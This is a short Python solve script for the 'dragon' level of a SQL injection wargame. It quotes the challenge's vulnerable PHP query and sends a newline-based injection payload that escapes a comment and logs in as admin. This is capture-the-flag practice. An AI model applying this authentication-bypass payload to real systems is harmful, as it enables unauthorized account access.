#!/usr/bin/env python3
import pickle
import los
from getpass import getpass


def main():
    '''
    Dragon

    if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
    $query = "select id from prob_dragon where id='guest'# and pw='{$_GET[pw]}'";
    echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
    $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
    if($result['id']) echo "<h2>Hello {$result[id]}</h2>"; 
    if($result['id'] == 'admin') solve("dragon");
    '''

    url = "https://los.rubiya.kr/chall/dragon_51996aa769df79afbf79eb4d66dbcef6.php"

    try:
        with open('cooks.pickle', 'rb') as f:
            cook = pickle.load(f)
    except:
        cook = {'PHPSESSID': getpass(
            prompt='enter PHPSESSID cookie: ')}

    if "location.href='../';" in los.get_request(url, {}, cook, print_param=False):
        print('you need to login in browser')
        exit(1)

    param = dict(pw="'\n&&0||id='admin")

    response = los.get_request(url, param, cook)

    if 'Clear!' in response:
        print('DRAGON Clear!')

    # Save cookie
    los.save_cookies(cook)


if __name__ == '__main__':
    main()
